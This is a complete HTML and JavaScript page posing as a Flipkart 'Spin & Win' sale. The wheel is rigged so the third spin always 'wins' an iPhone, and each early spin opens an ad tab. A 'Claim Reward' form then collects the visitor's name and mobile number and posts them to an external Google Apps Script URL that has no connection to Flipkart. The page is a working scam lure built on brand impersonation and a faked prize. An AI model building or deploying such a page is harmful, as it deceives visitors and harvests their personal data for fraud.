<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>üéâ Spin & Win ‚Äì Flipkart Big Sale!</title>
<style>
  :root { font-family: Roboto, Arial, sans-serif; }
  body { background:#f1f3f6; margin:0; padding:0; text-align:center; }
  header {
    background:#2874f0; color:#fff; padding:12px;
    font-size:1.05em; display:flex; align-items:center;
    justify-content:space-between; gap:8px;
  }
  header img { height:32px; }
  .cart {
    font-size:0.9em; background:#ffeb3b; color:#2874f0;
    padding:4px 8px; border-radius:12px; white-space:nowrap;
  }
  p { margin:14px; font-size:1rem; }

  .wheel-container {
    width:90vw; max-width:320px; height:90vw; max-height:320px;
    margin:18px auto; position:relative;
  }
  .wheel {
    width:100%; height:100%; border-radius:50%;
    border:8px solid #2874f0;
    background: conic-gradient(
      #ffeb3b 0deg 60deg,
      #2874f0 60deg 120deg,
      #ff7043 120deg 180deg,
      #43a047 180deg 240deg,
      #9c27b0 240deg 300deg,
      #ff9800 300deg 360deg
    );
    transition: transform 4s ease-out;
    position:relative; overflow:hidden;
  }
  .pointer {
    position:absolute; top:-28px; left:50%; transform:translateX(-50%);
    width:0; height:0;
    border-left:14px solid transparent;
    border-right:14px solid transparent;
    border-bottom:24px solid red;
  }
  .label {
    position:absolute; top:50%; left:50%;
    transform-origin:0 -45%;
  }
  .label img {
    width:60px; height:60px; object-fit:contain;
    background:white; border-radius:10px;
    box-shadow:0 2px 6px rgba(0,0,0,0.3);
  }

  .spin-btn {
    background:#ffeb3b; color:#2874f0;
    padding:12px 20px; border-radius:8px; border:none;
    font-weight:700; margin-top:18px; cursor:pointer;
  }
  #result { font-size:1.1rem; color:#d32f2f; margin-top:14px; }
  #claimSection { margin:30px auto; }
  #claimBtn {
    display:none; background:#2874f0; color:#fff;
    padding:10px 18px; border-radius:8px; border:none;
    cursor:pointer; font-size:1rem; margin-top:12px;
  }
  #userForm { display:none; max-width:320px; margin:18px auto; }
  input {
    padding:10px; margin:8px 0; width:90%;
    border:1px solid #ccc; border-radius:6px; font-size:1rem;
  }
  #submitBtn {
    background:green; color:#fff; padding:10px;
    border:0; border-radius:6px; width:100%; cursor:pointer;
  }
</style>
</head>
<body>

<header>
  <div><img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Flipkart_logo.svg" alt="Flipkart Logo"></div>
  <div>Big Billion Days ‚Äì Spin & Win üé°</div>
  <div class="cart" id="cart">Cart: 0</div>
</header>

<p>You have <b>3 Spins</b>. Win exciting prizes üéÅ</p>

<div class="wheel-container" id="gameArea" aria-hidden="false">
  <div class="pointer" aria-hidden="true"></div>
  <div id="wheel" class="wheel" aria-hidden="true">
    <!-- iPhone -->
    <div class="label" style="transform: rotate(30deg) translateY(-115px) rotate(-30deg);">
      <img src="iphone.png" alt="iPhone">
    </div>
    <!-- iPad -->
    <div class="label" style="transform: rotate(90deg) translateY(-115px) rotate(-90deg);">
      <img src="ipad.png" alt="iPad">
    </div>
    <!-- PS5 -->
    <div class="label" style="transform: rotate(150deg) translateY(-115px) rotate(-150deg);">
      <img src="ps5.png" alt="PS5">
    </div>
    <!-- Smartwatch -->
    <div class="label" style="transform: rotate(210deg) translateY(-115px) rotate(-210deg);">
      <img src="smartwatch.png" alt="Smartwatch">
    </div>
    <!-- Nothing -->
    <div class="label" style="transform: rotate(270deg) translateY(-115px) rotate(-270deg);">
      <img src="nothing.png" alt="Nothing">
    </div>
    <!-- Speaker -->
    <div class="label" style="transform: rotate(330deg) translateY(-115px) rotate(-330deg);">
      <img src="speaker.png" alt="Speaker">
    </div>
  </div>
</div>

<button id="spinBtn" class="spin-btn" aria-label="Spin Now">üé° Spin Now</button>
<div id="result" role="status" aria-live="polite"></div>

<div id="claimSection">
  <p id="claimMsg"></p>
  <button id="claimBtn">Claim Reward</button>
</div>

<form id="userForm" aria-label="Winner details">
  <input id="name" type="text" placeholder="Enter your name" required>
  <input id="mobile" type="tel" placeholder="Enter your mobile number" required>
  <button id="submitBtn" type="submit">Submit</button>
</form>

<script>
(function () {
  const wheel = document.getElementById('wheel');
  const spinBtn = document.getElementById('spinBtn');
  const result = document.getElementById('result');
  const claimMsg = document.getElementById('claimMsg');
  const claimBtn = document.getElementById('claimBtn');
  const cart = document.getElementById('cart');
  const userForm = document.getElementById('userForm');

  let spins = 0;
  let hasWon = false;
  let userSubmitted = false;

  spinBtn.addEventListener('click', () => {
    spins++;
    let degree;
    if (spins === 1) {
      degree = 1800 + 270; // land on "Nothing"
    } else if (spins === 2) {
      degree = 1800 + 90; // iPad
    } else {
      degree = 1800 + 30; // iPhone
      hasWon = true;
    }
    wheel.style.transform = 'rotate(' + degree + 'deg)';
    spinBtn.disabled = true;

    setTimeout(() => {
      if (spins === 1) result.textContent = '‚ùå Oops! No luck this time.';
      else if (spins === 2) result.textContent = 'Almost there! You got iPad.';
      else result.textContent = 'üéâ Congratulations! You won an iPhone üéÅ';

      claimMsg.textContent = 'Scroll down to claim your reward ‚¨áÔ∏è';
      claimBtn.style.display = 'inline-block';
      claimBtn.disabled = true;
      let time = 10;
      claimBtn.textContent = 'Claim Reward (' + time + ')';
      const timer = setInterval(() => {
        time--;
        claimBtn.textContent = 'Claim Reward (' + time + ')';
        if (time <= 0) {
          clearInterval(timer);
          claimBtn.disabled = false;
          claimBtn.textContent = 'Claim Reward';
        }
      }, 1000);

      window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });

      if (spins < 3) {
        setTimeout(() => {
          try { window.open('https://example.com/ad-page', '_blank'); } catch(e){}
          spinBtn.disabled = false;
        }, 2000);
      } else {
        spinBtn.style.display = 'none';
      }
    }, 4000);
  });

  claimBtn.addEventListener('click', () => {
    const current = parseInt(cart.textContent.replace(/\D/g, '') || '0', 10);
    cart.textContent = 'Cart: ' + (current + 1);
    claimBtn.style.display = 'none';
    if (hasWon && !userSubmitted) {
      userForm.style.display = 'block';
    }
  });

userForm.addEventListener('submit', (e) => {
  e.preventDefault();
  const name = document.getElementById('name').value.trim();
  const mobile = document.getElementById('mobile').value.trim();
  if (!name || !mobile) { 
    alert('Please enter name and mobile'); 
    return; 
  }

  const formData = new FormData();
  formData.append("name", name);
  formData.append("mobile", mobile);

  fetch('https://script.google.com/macros/s/AKfycbz3w4LyArVH5oz6O1PaU-T9_Sac8ewbOAFsq51-uhPhG5hnnOW5MaSd0MZSSYYlbR7A/exec', {
    method: 'POST',
    body: formData
  })
  .then(res => res.json())
  .then(data => {
    if (data.status === "success") {
      alert('‚úÖ Submitted successfully!');
      userForm.style.display = 'none';
      userSubmitted = true;
    } else {
      alert('‚ö†Ô∏è Error: ' + (data.message || "Unknown error"));
    }
  })
  .catch(() => { 
    alert('Submission failed ‚Äî try again later.'); 
  });
});

})();
</script>
</body>
</html>

